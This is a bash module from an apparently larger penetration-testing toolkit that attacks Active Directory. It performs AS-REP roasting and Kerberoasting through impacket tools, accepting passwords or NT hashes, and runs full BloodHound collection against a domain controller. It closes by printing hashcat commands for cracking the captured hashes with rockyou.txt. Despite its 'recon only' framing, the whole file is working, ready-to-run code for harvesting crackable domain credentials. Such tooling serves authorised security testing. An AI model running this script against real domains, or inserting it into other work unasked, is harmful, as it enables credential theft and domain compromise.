#!/usr/bin/env bash
# ==========================================================================
# 06-ad-recon.sh  -  Active Directory recon: AS-REP / Kerberoast collection
#                    and BloodHound graph collection.
#
#  RECON ONLY. This module COLLECTS data (roastable hashes for OFFLINE
#  cracking, directory objects, AD relationships). It never sprays or
#  brute-forces passwords against the domain, so it cannot lock accounts.
#  Crack any captured hashes offline, on your own hardware, out of band.
# ==========================================================================
set -euo pipefail
cd "$(dirname "$0")"
source ./config.sh
source ./lib/common.sh
RUN="${RUN:?RUN not set}"
OUT="$RUN/06-ad-recon"; mkdir -p "$OUT"; LOG="$OUT/ad.log"
DC="$RUN/hosts_dc.txt"
NXC=$(nxc_bin) || NXC=""

phase "Active Directory Recon"
[[ -s "$DC" ]] || { warn "No DC identified — AD recon needs a DC. Skipping."; exit 0; }
DC1=$(head -1 "$DC"); [[ -n "$DC_IP" ]] && DC1="$DC_IP"

# Username source: harvested list (from 03 RID-brute) > config wordlist.
USERS="$RUN/domain_users.txt"
[[ -s "$USERS" ]] || USERS="$USER_WORDLIST"

# ---- AS-REP roasting (no creds needed; users w/ pre-auth disabled) --------
# Requests AS-REP for accounts that don't require Kerberos pre-auth. This is a
# directory query, not an authentication attempt — it does not touch lockout.
if have GetNPUsers.py || have impacket-GetNPUsers; then
  GNP=$(command -v GetNPUsers.py || command -v impacket-GetNPUsers)
  if [[ -s "$USERS" ]]; then
    log "AS-REP roasting (no auth required; offline-crackable hashes)"
    run "$LOG" "$GNP" "${DOMAIN}/" -usersfile "$USERS" -no-pass -dc-ip "$DC1" \
      -outputfile "$OUT/asrep_hashes.txt" 2>/dev/null || true
  fi
elif [[ -n "$NXC" && -n "$USERNAME" ]]; then
  run "$LOG" "$NXC" ldap "$DC1" -u "$USERNAME" -p "${PASSWORD:-}" --asreproast "$OUT/asrep.txt" || true
fi

# ---- Kerberoasting (needs ANY valid read-only domain creds) ---------------
if [[ -n "$USERNAME" && ( -n "$PASSWORD" || -n "$NTHASH" ) ]]; then
  if have GetUserSPNs.py || have impacket-GetUserSPNs; then
    GSP=$(command -v GetUserSPNs.py || command -v impacket-GetUserSPNs)
    log "Kerberoasting (requesting TGS for all SPNs; offline-crackable hashes)"
    if [[ -n "$NTHASH" ]]; then
      run "$LOG" "$GSP" "$DOMAIN/$USERNAME" -hashes ":$NTHASH" -dc-ip "$DC1" \
        -request -outputfile "$OUT/kerberoast_hashes.txt" 2>/dev/null || true
    else
      run "$LOG" "$GSP" "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip "$DC1" \
        -request -outputfile "$OUT/kerberoast_hashes.txt" 2>/dev/null || true
    fi
  fi

  # ---- BloodHound collection ---------------------------------------------
  if have bloodhound-python; then
    log "BloodHound collection (-c all)"
    mkdir -p "$OUT/bloodhound"; pushd "$OUT/bloodhound" >/dev/null
    if [[ -n "$NTHASH" ]]; then
      bloodhound-python -d "$DOMAIN" -u "$USERNAME" --hashes ":$NTHASH" \
        -ns "$DC1" -c all --zip 2>&1 | tee -a "$LOG" || true
    else
      bloodhound-python -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" \
        -ns "$DC1" -c all --zip 2>&1 | tee -a "$LOG" || true
    fi
    popd >/dev/null
    ok "BloodHound zip -> $OUT/bloodhound (import into BloodHound GUI)"
  fi
else
  warn "No domain creds set — skipping Kerberoast & BloodHound (set read-only creds in config.sh)."
fi

log "Crack any collected roast hashes OFFLINE (out of band):"
log "  hashcat -m 13100 $OUT/kerberoast_hashes.txt rockyou.txt   # Kerberoast"
log "  hashcat -m 18200 $OUT/asrep_hashes.txt      rockyou.txt   # AS-REP"
ok "AD recon module complete -> $OUT"
